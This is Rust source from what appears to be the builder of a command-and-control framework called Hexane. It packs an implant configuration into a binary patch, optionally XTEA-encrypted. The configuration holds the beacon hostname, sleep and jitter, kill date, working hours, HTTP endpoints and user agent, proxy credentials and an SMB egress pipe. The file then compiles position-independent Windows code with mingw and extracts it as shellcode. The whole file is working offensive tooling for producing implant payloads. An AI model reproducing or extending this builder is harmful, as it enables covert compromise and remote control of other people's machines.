use std::fs;
use std::path::{Path, PathBuf};
use std::str::FromStr;
use rand::Rng;

use crate::stream::Stream;
use crate::binary::extract_section;
use crate::cipher::{crypt_create_key, crypt_xtea};
use crate::utils::{canonical_path_all, generate_definitions, generate_hashes, generate_includes, generate_object_path, normalize_path, run_command};

use crate::types::Hexane;
use crate::interface::wrap_message;

use crate::error::{Error, Result};
use crate::error::Error::Custom;
use crate::rstatic::USERAGENT;

use crate::types::NetworkType::Http as HttpType;
use crate::types::NetworkOptions::Http as HttpOpt;
use crate::types::NetworkType::Smb as SmbType;
use crate::types::NetworkOptions::Smb as SmbOpt;

pub static DEBUG_FLAGS: &'static str = "-std=c++23 -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel -fno-ident -fpack-struct=8 -falign-functions=1 -ffunction-sections -fdata-sections -falign-jumps=1 -w -falign-labels=1 -fPIC -fno-builtin '-Wl,--no-seh,--enable-stdcall-fixup' ";
pub static RELEASE_FLAGS: &'static str = "-std=c++23 -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel -fno-ident -fpack-struct=8 -falign-functions=1 -ffunction-sections -fdata-sections -falign-jumps=1 -w -falign-labels=1 -fPIC -fno-builtin '-Wl,--no-seh,--enable-stdcall-fixup' ";

impl Hexane {
    pub(crate) fn setup_build(&mut self) -> Result<()> {
        let mut rng = rand::thread_rng();

        self.peer_id = rng.random::<u32>();
        self.compiler_cfg.build_directory = format!("./payload/{}", &self.builder_cfg.output_name);

        let compiler_flags = if self.main_cfg.debug {
            DEBUG_FLAGS.parse().unwrap()
        }
        else {
            RELEASE_FLAGS.parse().unwrap()
        };

        self.compiler_cfg.flags = compiler_flags;

        if let Err(e) = fs::create_dir_all(&self.compiler_cfg.build_directory) {
            wrap_message("ERR", format!("create_dir_all: {e}").as_str());
            return Err(Error::from(e))
        }

        if let Err(e) = generate_hashes("./configs/strings.txt", "./core/include/names.hpp") {
            return Err(e);
        }

        if let Err(e) = self.create_config_patch() {
            return Err(e)
        }

        if let Err(e) = self.compile_sources() {
            return Err(e)
        }

        Ok(())
    }

    fn create_config_patch(&mut self) -> Result<()> {
        self.session_key = crypt_create_key(16);

        let mut patch = self.create_binary_patch()?;
        let encrypt = self.main_cfg.encrypt;

        if encrypt {
            let patch_cpy = patch;
            patch = crypt_xtea(&patch_cpy, &self.session_key, true)?;
        }

        self.config = patch;
        Ok(())
    }

    fn create_binary_patch(&mut self) -> Result<Vec<u8>> {
        let mut stream = Stream::new();

        stream.pack_uint32(self.peer_id);
        stream.pack_bytes(&self.session_key);
        stream.pack_string(&self.main_cfg.hostname);
        stream.pack_uint32(self.main_cfg.retries);

        let working_hours = self.main_cfg.working_hours
            .as_ref()
            .map_or(Ok(0), |hours| i32::from_str(hours))
            .unwrap();

        let kill_date = self.main_cfg.killdate
            .as_ref()
            .map_or(Ok(0), |date| i64::from_str(date))
            .unwrap();

        stream.pack_int32(working_hours);
        stream.pack_uint64(kill_date);
        stream.pack_uint32(self.main_cfg.sleeptime);
        stream.pack_uint32(self.main_cfg.jitter as u32);

        if let Some(modules) = &self.builder_cfg.loaded_modules {
            for module in modules {
                stream.pack_string(module);
            }
        } else {
            wrap_message("DBG", "no external module names found. continue.");
        }


        if let Some(network) = self.network_cfg.as_mut() {
            let rtype   = &network.r#type;
            let opts    = &network.options;

            match (rtype, &opts) {
                (HttpType, HttpOpt(ref http)) => {
                    let useragent = http.useragent.as_ref().unwrap_or(&USERAGENT);

                    stream.pack_wstring(useragent);
                    stream.pack_wstring(&http.address);
                    stream.pack_uint32(http.port as u32);
                    stream.pack_uint32(http.endpoints.len() as u32);

                    for endpoint in &http.endpoints {
                        stream.pack_wstring(endpoint);
                    }

                    if let Some(ref domain) = http.domain {
                        stream.pack_string(domain);
                    } else {
                        stream.pack_uint32(0);
                    }

                    if let Some(ref proxy) = http.proxy {
                        let proxy_url = format!("{}://{}:{}", proxy.proto, proxy.address, proxy.port);

                        stream.pack_uint32(1);
                        stream.pack_wstring(&proxy_url);
                        stream.pack_wstring(proxy.username.as_ref().unwrap());
                        stream.pack_wstring(proxy.password.as_ref().unwrap());
                    } else {
                        stream.pack_uint32(0);
                    }
                }

                (SmbType, SmbOpt(ref smb) ) => {
                    stream.pack_wstring(smb.egress_pipe
                        .as_ref()
                        .unwrap()
                        .as_str());
                }

                _ => {
                    wrap_message("ERR", "create_binary_patch: unknown network type");
                    return Err(Custom("JSONError".to_string()))
                }
            }
        }

        Ok(stream.buffer)
    }

    pub fn compile_sources(&mut self) -> Result<()> {
        let root_dir    = &self.builder_cfg.root_directory;
        let build_dir   = &self.compiler_cfg.build_directory;

        let mut components  = Vec::new();
        let src_path        = Path::new(root_dir).join("src");

        let entries = canonical_path_all(&src_path)
            .map_err(|e| {
                wrap_message("ERR", format!("canonical_path_all: {:?}:{e}", src_path).as_str());
                return Custom(e.to_string())
            })?;

        for path in entries {
            let source = normalize_path(path
                .to_str()
                .unwrap()
                .into()
            );

            let mut object_file = generate_object_path(&source, Path::new(build_dir))
                .map_err(|e| {
                    wrap_message("ERR", format!("compile_sources: {:?}:{e}", source)
                        .as_str());

                    return Custom(e.to_string())
                })?;

            object_file.set_extension("o");

            let object = normalize_path(object_file
                .to_string_lossy()
                .to_string()
            );

            let mut command = String::new();
            match path.extension().and_then(|ext| ext.to_str()) {

                Some("cpp") => {
                    components.push(source);
                },
                Some("asm") => {
                    command.push_str("nasm");
                    command.push_str(format!(" -f win64 {} -o {}", source, object).as_str());

                    if let Err(e) = run_command(&command.as_str(), format!("{}-compiler_error", self.builder_cfg.output_name).as_str()) {
                        wrap_message("ERR", format!("compile_sources:: {e} : {command}")
                            .as_str());

                        return Err(Custom("CommandError".to_string()));
                    }
                    components.push(object);
                },
                _ => {
                    continue;
                }
            }
        }

        if let Err(e) = self.run_mingw(components) {
            return Err(Custom(e.to_string()))
        };

        let output = &self.builder_cfg.output_name;
        let mut shellcode = self.compiler_cfg.build_directory.to_owned();

        shellcode.push_str("/shellcode.bin");
        extract_section(output, &self.config, shellcode.as_str())
    }

    fn run_mingw(&mut self, components: Vec<String>) -> Result<()> {
        let main_cfg    = &self.main_cfg;
        let network_cfg = &self.network_cfg.as_ref().unwrap();

        let definitions     = generate_definitions(main_cfg, network_cfg);
        let mut includes    = String::new();

        if let Some(dirs) = &self.builder_cfg.include_directories {
            includes = generate_includes(dirs);
        }

        let mut linker_script   = PathBuf::new();
        let mut linker          = String::new();

        if let Some(script) = &self.builder_cfg.linker_script {
            linker_script = Path::new(&self.builder_cfg.root_directory)
                .join(script);

            let path = linker_script
                .to_string_lossy()
                .to_string();

            linker = normalize_path(path);
            linker = format!(" -T\"{}\" ", linker);
        }

        let flags   = self.compiler_cfg.flags.clone();
        let sources = components.join(" ");

        includes.push_str(" -I\".\" ");

        let mut params = Vec::new();
        params.push(sources);
        params.push(includes);
        params.push(definitions);
        params.push(linker);
        params.push(flags);

        let build = &self.compiler_cfg.build_directory;
        let output = &self.builder_cfg.output_name.clone();

        self.builder_cfg.output_name = format!("{}/{}.exe", build, output);
        let command = format!("x86_64-w64-mingw32-g++ {} -o {}", params.join(" "), self.builder_cfg.output_name);

        // TODO: build fails because "sections below image base" which is normal for this.
        run_command(command.as_str(), format!("{}-linker_error", output).as_str());
        Ok(())
    }
}
